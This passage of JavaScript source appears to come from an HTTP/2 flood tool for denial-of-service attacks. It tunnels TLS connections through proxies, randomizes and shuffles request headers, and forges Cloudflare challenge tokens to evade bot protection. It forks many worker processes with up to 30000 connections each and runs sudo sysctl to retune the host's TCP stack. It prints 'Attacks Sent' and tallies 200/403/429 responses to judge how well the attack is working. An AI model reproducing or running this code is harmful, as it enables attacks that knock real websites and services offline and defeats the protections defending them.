                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = headers.concat(headers2);

                        function handleQuery(query) {
                            if (query === '1') {
                                return url.pathname + '?__cf_chl_rt_tk=' + randstrr(41) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return url.pathname;
                            }
                        }

                        const packed = hpack.encode(combinedHeaders);
                        requests.push(encodeFrame(streamId, 1, packed, 0x05));
                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            setTimeout(() => {
                                doWrite()
                            }, isFull ? 1000 : 1000 / ratelimit)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}


function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}


setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attacks Sent`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    const __workerSnap = {};
const __cum = { 200: 0, 403: 0, 429: 0, other: 0 };
let __lastCum = { 200: 0, 403: 0, 429: 0, other: 0 };
function __absorb() {
    for (const wid in workers) {
        const msg = workers[wid][1];
        if (!msg) continue;
        const prev = __workerSnap[wid] || {};
        for (const code in msg) {
            const d = (msg[code] || 0) - (prev[code] || 0);
            if (d > 0) {
                if (code === '200') __cum[200] += d;
                else if (code === '403') __cum[403] += d;
                else if (code === '429') __cum[429] += d;
                else __cum.other += d;
            }
        }
        __workerSnap[wid] = { ...msg };
    }
}
function __printSummary() {
    __absorb();
    const d = {
        200: __cum[200] - __lastCum[200],
        403: __cum[403] - __lastCum[403],
        429: __cum[429] - __lastCum[429],
        other: __cum.other - __lastCum.other
    };
    __lastCum = { ...__cum };
    const t = new Date().toLocaleTimeString('en-GB');
    console.log(`[${t}] 200 ${__cum[200]} (+${d[200]}) 403 ${__cum[403]} (+${d[403]}) 429 ${__cum[429]} (+${d[429]}) other ${__cum.other} (+${d.other})`);
}
function __printFinal() {
    __absorb();
    const total = __cum[200] + __cum[403] + __cum[429] + __cum.other;
    console.log(`\nFinal: 200=${__cum[200]} 403=${__cum[403]} 429=${__cum[429]} other=${__cum.other} total=${total}`);
}
if (debugMode) {
    setInterval(__printSummary, 1000);
}
process.on('SIGINT', () => { __printFinal(); process.exit(0); });

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => { __printFinal(); process.exit(1); }, time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);


    if (debugMode) {
        setInterval(() => {
            process.send({...statuses});
        }, 250);
    }

    setTimeout(() => process.exit(1), time * 1000);
}
